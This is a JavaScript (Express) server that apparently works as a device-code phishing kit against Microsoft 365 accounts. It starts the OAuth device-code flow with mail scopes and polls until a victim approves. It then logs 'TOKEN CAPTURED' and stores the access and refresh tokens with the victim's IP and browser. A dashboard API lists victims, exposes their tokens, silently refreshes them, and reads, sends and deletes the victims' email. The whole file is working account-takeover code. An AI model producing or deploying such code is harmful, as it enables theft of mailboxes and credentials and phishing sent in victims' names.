const express = require('express');
const axios = require('axios');
const cors = require('cors');
const crypto = require('crypto');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.static('public'));

// Device Code Flow Configuration
const MICROSOFT_CONFIG = {
    clientId: '1950a258-227b-4e31-a9cf-717495945fc2',
    deviceCodeUrl: 'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
    tokenUrl: 'https://login.microsoftonline.com/common/oauth2/v2.0/token',
    scopes: 'openid profile email User.Read Mail.Read Mail.ReadWrite'
};

let userSessions = new Map();
let pendingDeviceCodes = new Map();

function getClientIp(req) {
    return req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';
}

function getUserAgent(req) {
    return req.headers['user-agent'] || 'Unknown';
}

// Start Device Code Authentication
app.post('/api/device/auth/start', async (req, res) => {
    try {
        const clientIp = getClientIp(req);
        const userAgent = getUserAgent(req);
        
        console.log(`📱 Device auth request from IP: ${clientIp}`);
        
        const response = await axios.post(MICROSOFT_CONFIG.deviceCodeUrl,
            new URLSearchParams({
                client_id: MICROSOFT_CONFIG.clientId,
                scope: MICROSOFT_CONFIG.scopes
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        const { device_code, user_code, verification_uri, expires_in } = response.data;
        const sessionId = crypto.randomBytes(32).toString('hex');
        
        console.log(`✅ Generated code: ${user_code} for session: ${sessionId}`);
        
        pendingDeviceCodes.set(device_code, {
            device_code,
            user_code,
            sessionId,
            status: 'pending',
            ip: clientIp,
            userAgent: userAgent,
            createdAt: Date.now(),
            expiresAt: Date.now() + (expires_in * 1000)
        });
        
        // Start polling immediately
        pollForToken(device_code, sessionId);
        
        res.json({
            success: true,
            sessionId,
            user_code,
            verification_uri: 'https://microsoft.com/devicelogin',
            expires_in
        });
        
    } catch (err) {
        console.error('Device code error:', err.message);
        res.status(500).json({ error: 'Failed to start device authentication' });
    }
});

async function pollForToken(device_code, sessionId) {
    console.log(`🔄 Starting polling for device_code: ${device_code.substring(0, 10)}...`);
    
    const pollInterval = setInterval(async () => {
        const pending = pendingDeviceCodes.get(device_code);
        
        // Check if already approved or expired
        if (!pending || pending.status !== 'pending') {
            clearInterval(pollInterval);
            console.log(`⏹️ Stopping polling - status: ${pending?.status || 'not found'}`);
            return;
        }
        
        // Check if expired
        if (Date.now() > pending.expiresAt) {
            pending.status = 'expired';
            pendingDeviceCodes.delete(device_code);
            clearInterval(pollInterval);
            console.log(`⏰ Device code expired for session: ${sessionId}`);
            return;
        }
        
        try {
            console.log(`🔄 Polling Microsoft for token approval...`);
            
            const response = await axios.post(MICROSOFT_CONFIG.tokenUrl,
                new URLSearchParams({
                    grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
                    client_id: MICROSOFT_CONFIG.clientId,
                    device_code: device_code
                }), {
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
                }
            );
            
            const tokens = response.data;
            console.log('🎉 TOKEN RECEIVED! Getting user info...');
            
            // Get user info from Microsoft Graph
            const userInfo = await axios.get('https://graph.microsoft.com/v1.0/me', {
                headers: { 'Authorization': `Bearer ${tokens.access_token}` }
            });
            
            const session = {
                sessionId: pending.sessionId,
                email: userInfo.data.mail || userInfo.data.userPrincipalName,
                displayName: userInfo.data.displayName,
                userId: userInfo.data.id,
                ip: pending.ip,
                userAgent: pending.userAgent,
                tokens: {
                    access_token: tokens.access_token,
                    refresh_token: tokens.refresh_token,
                    expires_in: tokens.expires_in,
                    expires_at: Date.now() + (tokens.expires_in * 1000)
                },
                createdAt: new Date().toISOString(),
                lastActive: new Date().toISOString()
            };
            
            userSessions.set(pending.sessionId, session);
            pending.status = 'approved';
            pendingDeviceCodes.delete(device_code);
            clearInterval(pollInterval);
            
            console.log(`✅✅✅ TOKEN CAPTURED for ${session.email} ✅✅✅`);
            console.log(`📊 Total sessions: ${userSessions.size}`);
            
        } catch (err) {
            // authorization_pending is normal - user hasn't approved yet
            if (err.response?.data?.error === 'authorization_pending') {
                console.log('⏳ Waiting for user to enter code and click Continue...');
            } else if (err.response?.data?.error === 'slow_down') {
                console.log('🐌 Rate limited, continuing...');
            } else {
                console.log('Polling error:', err.response?.data?.error || err.message);
            }
        }
    }, 3000);
}

// Check authentication status
app.get('/api/device/status/:sessionId', async (req, res) => {
    const { sessionId } = req.params;
    
    const session = userSessions.get(sessionId);
    if (session) {
        return res.json({ status: 'approved', email: session.email, sessionId: session.sessionId });
    }
    
    for (const pending of pendingDeviceCodes.values()) {
        if (pending.sessionId === sessionId) {
            return res.json({ status: pending.status });
        }
    }
    
    res.json({ status: 'not_found' });
});

// Get all sessions for dashboard
app.get('/api/sessions', async (req, res) => {
    const sessions = Array.from(userSessions.values()).map(s => ({
        sessionId: s.sessionId,
        email: s.email,
        displayName: s.displayName,
        ip: s.ip,
        userAgent: s.userAgent,
        lastActive: s.lastActive,
        createdAt: s.createdAt
    }));
    console.log(`📊 Returning ${sessions.length} sessions to dashboard`);
    res.json({ sessions });
});

// Get session token details
app.get('/api/session/token/:sessionId', async (req, res) => {
    const { sessionId } = req.params;
    const session = userSessions.get(sessionId);
    
    if (!session) {
        return res.status(404).json({ error: 'Session not found' });
    }
    
    res.json({
        email: session.email,
        expiresAt: session.tokens.expires_at,
        token: {
            access_token: session.tokens.access_token,
            refresh_token: session.tokens.refresh_token ? session.tokens.refresh_token.substring(0, 50) + '...' : 'N/A',
            expires_in: session.tokens.expires_in
        }
    });
});

// Refresh token helper
async function refreshUserToken(session) {
    try {
        console.log(`🔄 Refreshing token for ${session.email}`);
        const response = await axios.post(MICROSOFT_CONFIG.tokenUrl,
            new URLSearchParams({
                grant_type: 'refresh_token',
                refresh_token: session.tokens.refresh_token,
                client_id: MICROSOFT_CONFIG.clientId
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        session.tokens.access_token = response.data.access_token;
        session.tokens.refresh_token = response.data.refresh_token || session.tokens.refresh_token;
        session.tokens.expires_in = response.data.expires_in;
        session.tokens.expires_at = Date.now() + (response.data.expires_in * 1000);
        session.lastActive = new Date().toISOString();
        
        return session.tokens.access_token;
    } catch (err) {
        console.error('Token refresh failed:', err.message);
        return null;
    }
}

async function getValidToken(session) {
    if (Date.now() >= session.tokens.expires_at - 300000) {
        return await refreshUserToken(session);
    }
    return session.tokens.access_token;
}

// Get user's emails
app.get('/api/mail/:sessionId/:folderId', async (req, res) => {
    const { sessionId, folderId } = req.params;
    const session = userSessions.get(sessionId);
    
    if (!session) return res.status(401).json({ error: 'Session not found' });
    
    const token = await getValidToken(session);
    if (!token) return res.status(401).json({ error: 'Token expired' });
    
    try {
        const folderMap = {
            'inbox': 'inbox',
            'sent': 'sentitems',
            'drafts': 'drafts',
            'deleted': 'deleteditems'
        };
        const folderPath = folderMap[folderId] || folderId;
        
        const response = await axios.get(`https://graph.microsoft.com/v1.0/me/mailFolders/${folderPath}/messages`, {
            headers: { 'Authorization': `Bearer ${token}` },
            params: { '$top': 50, '$orderby': 'receivedDateTime desc', '$select': 'id,subject,from,receivedDateTime,isRead,bodyPreview,hasAttachments' }
        });
        res.json(response.data);
    } catch (err) {
        res.status(500).json({ error: 'Failed to fetch emails' });
    }
});

// Get single email
app.get('/api/mail/message/:sessionId/:messageId', async (req, res) => {
    const { sessionId, messageId } = req.params;
    const session = userSessions.get(sessionId);
    
    if (!session) return res.status(401).json({ error: 'Session not found' });
    
    const token = await getValidToken(session);
    if (!token) return res.status(401).json({ error: 'Token expired' });
    
    try {
        const response = await axios.get(`https://graph.microsoft.com/v1.0/me/messages/${messageId}`, {
            headers: { 'Authorization': `Bearer ${token}` },
            params: { '$select': 'id,subject,from,toRecipients,receivedDateTime,isRead,body,bodyPreview,hasAttachments' }
        });
        res.json(response.data);
    } catch (err) {
        res.status(500).json({ error: 'Failed to fetch message' });
    }
});

// Send email
app.post('/api/mail/send/:sessionId', async (req, res) => {
    const { sessionId } = req.params;
    const { to, subject, body } = req.body;
    const session = userSessions.get(sessionId);
    
    if (!session) return res.status(401).json({ error: 'Session not found' });
    
    const token = await getValidToken(session);
    if (!token) return res.status(401).json({ error: 'Token expired' });
    
    try {
        await axios.post('https://graph.microsoft.com/v1.0/me/sendMail', {
            message: {
                subject: subject,
                body: { contentType: 'HTML', content: body },
                toRecipients: to.map(email => ({ emailAddress: { address: email } }))
            },
            saveToSentItems: true
        }, { headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' } });
        
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: 'Failed to send email' });
    }
});

// Delete email
app.delete('/api/mail/message/:sessionId/:messageId', async (req, res) => {
    const { sessionId, messageId } = req.params;
    const session = userSessions.get(sessionId);
    
    if (!session) return res.status(401).json({ error: 'Session not found' });
    
    const token = await getValidToken(session);
    if (!token) return res.status(401).json({ error: 'Token expired' });
    
    try {
        await axios.delete(`https://graph.microsoft.com/v1.0/me/messages/${messageId}`, {
            headers: { 'Authorization': `Bearer ${token}` }
        });
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: 'Failed to delete message' });
    }
});

// Mark as read/unread
app.patch('/api/mail/message/:sessionId/:messageId', async (req, res) => {
    const { sessionId, messageId } = req.params;
    const { isRead } = req.body;
    const session = userSessions.get(sessionId);
    
    if (!session) return res.status(401).json({ error: 'Session not found' });
    
    const token = await getValidToken(session);
    if (!token) return res.status(401).json({ error: 'Token expired' });
    
    try {
        await axios.patch(`https://graph.microsoft.com/v1.0/me/messages/${messageId}`, 
            { isRead: isRead },
            { headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' } }
        );
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: 'Failed to update message' });
    }
});

// Clear all sessions
app.delete('/api/sessions/clear', async (req, res) => {
    userSessions.clear();
    console.log('🗑️ All sessions cleared');
    res.json({ success: true });
});

// Export sessions
app.get('/api/sessions/export', async (req, res) => {
    const exportData = Array.from(userSessions.values()).map(s => ({
        email: s.email,
        displayName: s.displayName,
        createdAt: s.createdAt,
        ip: s.ip
    }));
    res.json(exportData);
});

// Serve dashboard
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Dashboard running on port ${PORT}`);
    console.log(`✅ Server ready for Device Code Flow with consent screen`);
});
